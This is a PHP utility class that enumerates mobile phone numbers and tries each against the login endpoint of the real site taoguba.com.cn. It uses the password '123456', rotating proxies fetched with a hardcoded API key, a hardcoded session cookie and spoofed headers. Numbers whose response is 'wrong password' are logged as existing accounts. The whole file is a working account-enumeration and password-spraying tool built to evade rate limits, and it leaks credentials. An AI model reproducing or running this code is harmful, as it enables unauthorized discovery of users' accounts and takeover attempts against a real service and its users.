<?php
/**
 * Created by PhpStorm.
 * User: b_tt
 * Date: 19/1/28
 * Time: 10:37
 */

namespace common\utils;


use common\models\Log;

class TryPhone
{
	const APP_KEY = 'af295cc800a749b5bc66ddd07952cfee';
//	const URL_GET_IPS = 'http://piping.mogumiao.com/proxy/api/get_ip_bs?appKey=405b848e01284a42a1b2152b48973894&count=10&expiryDate=0&format=1&newLine=2';
	const URL_GET_IPS = 'http://mvip.piping.mogumiao.com/proxy/api/get_ip_bs?appKey=af295cc800a749b5bc66ddd07952cfee&count=7&expiryDate=0&format=1&newLine=2';

	const URL_TAOGUBA_LOGIN = 'https://sso.taoguba.com.cn/web/login/submit';

	const LOCAL_IP = '139.199.31.56';
	const COOKIE = 'Hm_lvt_cc6a63a887a7d811c92b7cc41c441837=1548320523; UM_distinctid=1687f18470f485-00955950e23854-10346656-fa000-1687f184711b32; CNZZDATA1574657=cnzz_eid%3D2073132248-1548319611-https%253A%252F%252Fwww.taoguba.com.cn%252F%26ntime%3D1548319611; JSESSIONID=d82ef175-fd60-46a4-9c4d-494d410475ef; Hm_lpvt_cc6a63a887a7d811c92b7cc41c441837=1548320768';

	/**
	 * 原文：https://blog.csdn.net/u013091013/article/details/81312559
	 */
	public static function updateIPs()
	{
		$link = self::URL_GET_IPS;
		$ret = AppUtil::httpGet($link);
		$ret = json_decode($ret, 1);
		print_r($ret);
		$ip_port = [];
		if (is_array($ret) && $ret['code'] == 0) {
			foreach ($ret['msg'] as $v) {
				$ip_port[] = $v['ip'] . ":" . $v['port'];
			}
		}

		RedisUtil::init(RedisUtil::KEY_PROXY_IPS, self::LOCAL_IP)->setCache($ip_port);

	}

	public static function get_proxy_ip()
	{
		$ret = RedisUtil::init(RedisUtil::KEY_PROXY_IPS, self::LOCAL_IP)->getCache();
		$ret = json_decode($ret, 1);
		if (is_array($ret)) {
			shuffle($ret);
			return $ret[0];
		}
		return "";
	}

	public static function logFile($msg, $funcName = '', $line = '', $filename = "try_phone")
	{
		if (is_array($msg)) {
			$msg = json_encode($msg, JSON_UNESCAPED_UNICODE);
		}
		if ($funcName) {
			$msg = $funcName . ' ' . $line . ': ' . $msg;
		} else {
			$msg = 'message: ' . $msg;
		}
		$fileName = AppUtil::logDir() . 'phone_' . $filename . date('Ymd') . '.log';
		@file_put_contents($fileName, date('Y-m-d H:i:s') . ' ' . $msg . PHP_EOL, FILE_APPEND);
	}


	public static function taoguba_phone($data)
	{
		$ip_port = self::get_proxy_ip();
		self::logFile('$ip_port=>' . $ip_port, __FUNCTION__, __LINE__);
		if (!$ip_port) {
			return false;
		}
		$arrip = explode(":", $ip_port);
		$appKey = "Basic" . self::APP_KEY;

		$link = self::URL_TAOGUBA_LOGIN;

		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $link);//设置链接
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC); //代理认证模式
		curl_setopt($ch, CURLOPT_PROXY, $arrip[0]); //代理服务器地址
		curl_setopt($ch, CURLOPT_PROXYPORT, $arrip[1]); //代理服务器端口
		curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // https请求 不验证证书和hosts
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);

		curl_setopt($ch, CURLOPT_TIMEOUT, 30);//设置超时时间
		curl_setopt($ch, CURLOPT_COOKIE, self::COOKIE);

		curl_setopt($ch, CURLOPT_POST, 1);
		$postdata = "";
		foreach ($data as $key => $value) {
			$postdata .= ($key . '=' . $value . '&');
		}
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		curl_setopt($ch, CURLOPT_HTTPHEADER,
			[
				'Accept:*/*',
				'accept-encoding: gzip, deflate, br',
				'accept-language: zh-CN,zh;q=0.9,en;q=0.8',
				'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
				'Content-Length: ' . strlen($postdata),
				"Proxy-Authorization: {$appKey}",
				"User-Agent:Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.1.0.13",
				'origin: https://sso.taoguba.com.cn',
				'Referer: https://sso.taoguba.com.cn/xdomainProxy.html',
				'X-Requested-With: XMLHttpRequest',
			]);

		$response = curl_exec($ch);
		if ($response === false) {
			$error_info = curl_error($ch);
			curl_close($ch);// 关闭curl
			return false;
		} else {
			curl_close($ch);//关闭 curl
			return $response;
		}
	}

	// bj
	public static function phone_section_1()
	{
		// select group_concat(oOpenId) from  im_log where oCategory='phone_section' and oBefore='beijing' and oKey=1 group by oCategory order by oId asc limit 100;
		$phone_section = [
			1881145, 1521009, 1551069, 1863116, 1397886, 1581156, 1511795, 1820103, 1836611, 1880123, 1551025, 1851580, 1862845, 1771838, 1880013, 1891080, 1881315, 1352235, 1590291, 1350105, 1380121, 1860044, 1761162, 1537301, 1368127, 1362115, 1561102, 1391026, 1891113, 1861815, 1372004, 1851048, 1305191, 1381198, 1368365, 1361119, 1330122, 1352129, 1371810, 1891133, 1851311, 1861174, 1891030, 1861192, 1504007, 1391183, 1861016, 1391076, 1841028, 1369128, 1326033, 1850026, 1346666, 1367134, 1391018, 1891081, 1864641, 1380100, 1391141, 1381050, 1860132, 1581004, 1381000, 1391104, 1891053, 1352194, 1851808, 1861264, 1861021, 1861838, 1340111, 1326971, 5786511, 1581039, 1343970, 1800632, 1391122, 1326122, 1234567, 1331234, 1111111, 1333444, 1851074, 1333119, 1590100, 1352018, 1346635, 1370110, 1871003, 1861163, 1391157, 1381102, 1358153, 1501143, 1731017, 1336637, 1581129, 1312026, 1760038, 1368121, 1390120, 1567947, 1860003, 1570168, 1885695, 1850004, 1561546, 1352182, 1331110, 1861259, 1360100, 1365137, 1851016, 1380102, 1771063, 1391080, 1358190, 1590125, 1860137, 1761167, 1891094, 1391096, 1352423, 1851032, 1362138, 1312149, 1891102, 1381171,
		];
		foreach ($phone_section as $p) {
			self::combind_phone($p);
		}
	}

	// tianjin
	public static function phone_section_2()
	{
		// select group_concat(oOpenId) from  im_log where oCategory='phone_section' and oBefore='tianjin' and oKey=1 group by oCategory order by oId asc limit 100;
		$phone_section = [
			1352622, 1852225, 1331203, 1320758, 1355244, 1781023, 1862221, 1551095, 1382122, 1586609, 1372238, 1382129, 1892027, 1860229, 1862271, 1382127, 1382062, 1522226, 1592202, 1872221, 1382031, 1302135, 1362218, 1502258, 1502239, 1392041, 1375220, 1361208, 1392069, 1351622, 1860226, 1512216, 1863099, 1552293, 1852236, 1592208, 1317663, 1382185, 1760269, 1303225, 1863090, 1351222, 1351225, 1862252, 1351226, 1351228, 1351241, 1351243, 1351245, 1351281, 1351285, 1351286, 1351287
		];
		foreach ($phone_section as $p) {
			self::combind_phone($p);
		}
	}

	// shanghai
	public static function phone_section_3()
	{
		$phone_section = [
			1301283, 1391775, 1592125, 1586584, 1891830, 1590211, 1862181, 1377026, 1335798, 1368166, 1348281, 1893083, 1582113, 1365637, 1302068, 1505373, 1337111, 1500025, 1821717, 1390188, 1522150, 1770511, 1836115, 1592197, 1832119, 1734976, 1366301, 1368179, 1590214, 1381641, 1521037, 1361164, 1500188, 1381643, 1590086, 1391836, 1391844, 1500092, 1500045, 1502673, 1502131, 1502155, 1522134, 1580195, 1390146, 1582164, 1582196, 1358554, 1361161, 1364182, 1391749
		];
		foreach ($phone_section as $p) {
			self::combind_phone($p);
		}
	}

	public static function phone_section_base($index = 1)
	{
		while (1) {
			$log = Log::findOne(['oCategory' => Log::CAT_PHONE_SECTION, 'oKey' => Log::KEY_WAIT]);
			if ($log) {
				$p = $log->oOpenId;
				// echo $p . PHP_EOL;
				$log->oKey = Log::KEY_USED;
				$log->oAfter = $index;
				$log->save();
				self::combind_phone($p);
			} else {
				break;
			}
		}
	}

	public static function phone_section_4()
	{
		self::phone_section_base(4);
	}

	public static function phone_section_5()
	{
		self::phone_section_base(5);
	}

	public static function phone_section_6()
	{
		self::phone_section_base(6);
	}

	public static function phone_section_7()
	{
		self::phone_section_base(7);
	}


	public static function combind_phone($p)
	{

		for ($i = 0; $i < 9999; $i++) {
			$phone = $p * 10000 + $i;
			self::req($phone);
		}
	}

	public static function req($phone)
	{
		$data = [
			'userName' => $phone,
			'password' => "123456",
			'save' => "Y",
			'url' => "https://www.taoguba.com.cn/index?blockID=1",
		];
		$ret = TryPhone::taoguba_phone($data);
		// echo $phone . ' ===== ' . $ret . PHP_EOL;
		self::logFile(['phone' => $phone, 'ret' => $ret], __FUNCTION__, __LINE__, 'logs');
		if ($ret) {
			$ret = json_decode($ret, 1);
			if (isset($ret['errorMessage']) && $ret['errorMessage'] == "密码错误") {
				self::logFile(['phone' => $phone], __FUNCTION__, __LINE__, 'yes');
				Log::add_phone_section_yes($phone, "taoguba");
			}
		}

	}
}